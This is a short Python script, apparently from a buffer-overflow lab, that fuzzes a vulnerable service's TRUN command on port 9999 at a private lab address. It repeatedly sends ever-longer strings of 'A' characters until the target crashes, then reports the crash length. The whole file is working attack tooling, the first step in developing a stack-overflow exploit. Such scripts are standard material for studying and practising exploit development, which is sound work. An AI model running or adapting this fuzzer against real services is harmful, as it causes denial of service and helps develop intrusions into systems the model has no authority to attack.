#!/usr/bin/python3
import socket
import sys
from time import sleep


number_of_characters = 100
string_to_send = "TRUN /.:/" + "A" * 2000

while True:
    try:
        mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        mysocket.connect(("10.0.2.4", 9999))
        byties = string_to_send.encode(encoding="latin1")
        mysocket.send(byties)
        mysocket.close()

        string_to_send = string_to_send + "A" * number_of_characters
        sleep(1)

    except KeyboardInterrupt:
        print("Crashed at " + str(len(string_to_send)))
        sys.exit()
    except Exception as e:
        print("Crashed at " + str(len(string_to_send)))
        print(e)
        sys.exit()